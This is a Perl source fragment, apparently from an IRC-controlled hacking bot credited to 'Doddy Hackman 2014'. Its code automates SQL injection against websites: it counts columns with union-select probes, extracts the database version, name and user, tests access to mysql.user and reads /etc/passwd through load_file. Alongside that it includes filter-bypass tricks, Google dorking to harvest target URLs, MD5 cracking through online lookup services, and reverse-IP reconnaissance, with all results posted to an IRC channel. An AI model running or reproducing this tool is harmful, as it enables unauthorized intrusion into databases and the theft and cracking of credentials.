                || $code =~ /mysql_fetch_assoc/ig
                || $code =~ /mysql_query/ig
                || $code =~ /mysql_free_result/ig
                || $code =~ /equivocado en su sintax/ig
                || $code =~ /You have an error in your SQL syntax/ig
                || $code =~ /Call to undefined function/ig )
            {
                $code1 =
                  toma( $page . "-1"
                      . $pass1 . "union"
                      . $pass1
                      . "select"
                      . $pass1 . "666"
                      . $pass2 );
                if ( $code1 =~
/The used SELECT statements have a different number of columns/ig
                  )
                {
                    my $path = $1;
                    chomp $path;
                    $alert = "char(" . ascii("RATSXPDOWN1RATSXPDOWN") . ")";
                    $total = "1";
                    for my $rows ( 2 .. 52 ) {
                        $asc .= "," . "char("
                          . ascii( "RATSXPDOWN" . $rows . "RATSXPDOWN" ) . ")";
                        $total .= "," . $rows;
                        $injection =
                            $page . "-1"
                          . $pass1 . "union"
                          . $pass1
                          . "select"
                          . $pass1
                          . $alert
                          . $asc;
                        $test = toma($injection);
                        if ( $test =~ /RATSXPDOWN/ ) {
                            @number = $test =~ m{RATSXPDOWN(\d+)RATSXPDOWN}g;
                            print $soquete
                              "PRIVMSG $canal : [Page] : $page\r\n";
                            print $soquete
"PRIVMSG $canal : [Limit] : The site has $rows columns\r\n";
                            print $soquete
"PRIVMSG $canal : [Data] : The number @number print data\r\n";
                            if ( $test =~ /RATSXPDOWN(\d+)/ ) {
                                if ($path) {
                                    print $soquete
"PRIVMSG $canal : [Full Path Discloure] : $path\r\n";
                                }
                                $total =~ s/@number[0]/hackman/;
                                print $soquete
                                  "PRIVMSG $canal : [+] Injection SQL : "
                                  . $page . "-1"
                                  . $pass1 . "union"
                                  . $pass1
                                  . "select"
                                  . $pass1
                                  . $total . "\r\n";
                                &details(
                                    $page . "-1"
                                      . $pass1 . "union"
                                      . $pass1
                                      . "select"
                                      . $pass1
                                      . $total,
                                    $_[1]
                                );
                                last;
                            }
                        }
                    }
                }
            }

            sub details {
                my $page = $_[0];
                ( $pass1, $pass2 ) = &bypass( $ARGV[1] );
                if ( $page =~ /(.*)hackman(.*)/ig ) {
                    my $start = $1;
                    my $end   = $2;
                    $test1 =
                      toma( $start
                          . "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))"
                          . $end
                          . $pass1 . "from"
                          . $pass1
                          . "information_schema.tables"
                          . $pass2 );
                    $test2 =
                      toma( $start
                          . "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))"
                          . $end
                          . $pass1 . "from"
                          . $pass1
                          . "mysql.user"
                          . $pass2 );
                    $test3 =
                      toma( $start
                          . "unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(0x2f6574632f706173737764))))"
                          . $end
                          . $pass2 );
                    if ( $test2 =~ /ERTOR854/ig ) {
                        print $soquete
                          "PRIVMSG $canal : [+] MYSQL User : ON\r\n";
                    }
                    if ( $test1 =~ /ERTOR854/ig ) {
                        print $soquete
                          "PRIVMSG $canal : [+] information_schema : ON\r\n";
                    }
                    if ( $test3 =~ /ERTOR854/ig ) {
                        print $soquete
                          "PRIVMSG $canal : [+] load_file : ON\r\n";
                    }
                    $code =
                      toma( $start
                          . "unhex(hex(concat(char(69,82,84,79,82,56,53,52),version(),char(69,82,84,79,82,56,53,52),database(),char(69,82,84,79,82,56,53,52),user(),char(69,82,84,79,82,56,53,52))))"
                          . $end
                          . $pass2 );
                    if ( $code =~
                        /ERTOR854(.*)ERTOR854(.*)ERTOR854(.*)ERTOR854/g )
                    {
                        print $soquete
                          "PRIVMSG $canal : [!] DB Version : $1\r\n";
                        print $soquete "PRIVMSG $canal : [!] DB Name : $2\r\n";
                        print $soquete
                          "PRIVMSG $canal : [!] user_name : $3\r\n";
                    }
                    else {
                        print $soquete
                          "PRIVMSG $canal : [-] Not found any data\r\n";
                    }
                    print $soquete "PRIVMSG $canal : [+] Scan Finished\r\n";
                }
            }
        }

    }

    sub infocon {
        my $target = shift;

        my ( $scheme, $auth, $path, $query, $frag ) = uri_split($target);

        if ( $auth ne "" ) {

            my $get    = gethostbyname($auth);
            my $target = inet_ntoa($get);

            print $soquete "PRIVMSG $canal : [+] Getting info\r\n";

            $total =
"http://www.melissadata.com/lookups/iplocation.asp?ipaddress=$target";
            $re = toma($total);

            if ( $re =~ /City<\/td><td align=(.*)><b>(.*)<\/b><\/td>/ ) {
                print $soquete "PRIVMSG $canal : [+] City : $2\r\n";
            }
            else {
                print $soquete "PRIVMSG $canal : [-] Not Found\r\n";
            }
            if ( $re =~ /Country<\/td><td align=(.*)><b>(.*)<\/b><\/td>/ ) {
                print $soquete "PRIVMSG $canal : [+] Country : $2\r\n";
            }
            if ( $re =~
                /State or Region<\/td><td align=(.*)><b>(.*)<\/b><\/td>/ )
            {
                print $soquete "PRIVMSG $canal : [+] State or Region : $2\r\n";

            }

            print $soquete "PRIVMSG $canal : [+] Getting Hosts\r\n";

            my $code = toma( "http://www.ip-adress.com/reverse_ip/" . $target );

            while ( $code =~ /whois\/(.*?)\">Whois/g ) {
                my $dns = $1;
                chomp $dns;
                print $soquete "PRIVMSG $canal : [DNS] : $dns\r\n";

            }
        }
    }

}    #

# Functions

sub crackit {

    my $md5 = shift;
    my $resultado;

## www.md5.net

    my $code = tomar(
        "http://www.md5.net/cracker.php",
        { 'hash' => $md5, 'submit' => 'Crack' }
    );

    if ( $code =~ m{<input type="text" id="hash" size="(.*?)" value="(.*?)"/>}
        and $code !~ /Entry not found./mig )
    {

        $resultado = $2;

    }
    else {

## md5online.net

        my $code = tomar( "http://md5online.net/index.php",
            { 'pass' => $md5, 'option' => 'hash2text', 'send' => 'Submit' } );

        if ( $code =~
            /<center><p>md5 :<b>(.*?)<\/b> <br>pass : <b>(.*?)<\/b><\/p>/ )
        {
            $resultado = $2;
        }
        else {

## md5decryption.com

            my $code = tomar(
                "http://md5decryption.com/index.php",
                { 'hash' => $md5, 'submit' => 'Decrypt It!' }
            );

            if ( $code =~ /Decrypted Text: <\/b>(.*?)<\/font>/ ) {
                $resultado = $1;
            }
            else {

## md5.my-addr.com

                my $code = tomar(
"http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php",
                    { 'md5' => $md5 }
                );

                if ( $code =~
/<span class='middle_title'>Hashed string<\/span>: (.*?)<\/div>/
                  )
                {
                    $resultado = $1;
                }
                else {
                    $resultado = "false01";
                }
            }
        }
    }
    return $resultado;
}

sub bypass {
    if    ( $_[0] eq "/*" )  { return ( "/**/", "/*" ); }
    elsif ( $_[0] eq "%20" ) { return ( "%20",  "%00" ); }
    else                     { return ( "+",    "--" ); }
}

sub ascii {
    return join ',', unpack "U*", $_[0];
}

sub ascii_de {
    $_[0] = join q[], map { chr } split q[,], $_[0];
    return $_[0];
}

sub encode {
    my $string = $_[0];
    $hex = '0x';
    for ( split //, $string ) {
        $hex .= sprintf "%x", ord;
    }
    return $hex;
}

sub decode {
    $_[0] =~ s/^0x//;
    $encode = join q[], map { chr hex } $_[0] =~ /../g;
    return $encode;
}

sub google {
    my ( $a, $b ) = @_;
    for ( $pages = 10 ; $pages <= $b ; $pages = $pages + 10 ) {
        $code = toma(
            "http://www.google.com.ar/search?hl=&q=" . $a . "&start=$pages" );
        my @links = get_links($code);
        for my $l (@links) {
            if ( $l =~ /webcache.googleusercontent.com/ ) {
                push( @url, $l );
            }
        }
    }
    for (@url) {
        if ( $_ =~ /cache:(.*?):(.*?)\+/ ) {
            push( @founds, $2 );
        }
    }
    my @founds = repes( cortar(@founds) );
    return @founds;
}

sub repes {
    my @limpio;
    foreach $test (@_) {
        push @limpio, $test unless $repe{$test}++;
    }
    return @limpio;
}

sub cortar {
    my @nuevo;
    for (@_) {
        if ( $_ =~ /=/ ) {
            @tengo = split( "=", $_ );
            push( @nuevo, @tengo[0] . "=" );
        }
        else {
            push( @nuevo, $_ );
        }
    }
    return @nuevo;
}

sub get_links {
    $test = HTML::LinkExtor->new( \&agarrar )->parse( $_[0] );
    return @links;

    sub agarrar {
        my ( $a, %b ) = @_;
        push( @links, values %b );
    }
}

sub toma {
    return $nave->get( $_[0] )->content;
}

sub tomar {
    my ( $web, $var ) = @_;
    return $nave->post( $web, [ %{$var} ] )->content;
}

sub tomados {
    return $nave->get( $_[0] );
}

sub tomax {
    return $nave->get( $_[0] );
}

sub savefile {
    open( SAVE, ">>" . $_[0] );
    print SAVE $_[1] . "\n";
    close SAVE;
}

sub abrir {
    open my $FILE, q[<], "config.txt";
    my $word = join q[], <$FILE>;
    close $FILE;
    return $word;
}

sub head {
    print qq(

  @@@@  @       @    @@@@@  @@@@@  @@@@@     @    @@@@@     @  @@@@@    @@@@ 
 @    @ @       @    @    @   @    @    @    @    @    @    @  @    @  @    @
 @      @      @ @   @    @   @    @    @   @ @   @    @    @  @    @  @     
 @      @      @ @   @    @   @    @    @   @ @   @    @    @  @    @  @     
 @      @     @   @  @@@@@    @    @@@@@   @   @  @@@@@     @  @@@@@   @     
 @      @     @   @  @        @    @    @  @   @  @         @  @    @  @     
 @      @     @@@@@  @        @    @    @  @@@@@  @         @  @    @  @     
 @    @ @    @     @ @        @    @    @ @     @ @         @  @    @  @    @
  @@@@  @@@@@@     @ @        @    @    @ @     @ @         @  @    @   @@@@ 



);
}

sub copyright {
    print "\n\n-- == (C) Doddy Hackman 2014 == --\n\n";
}

# The End ?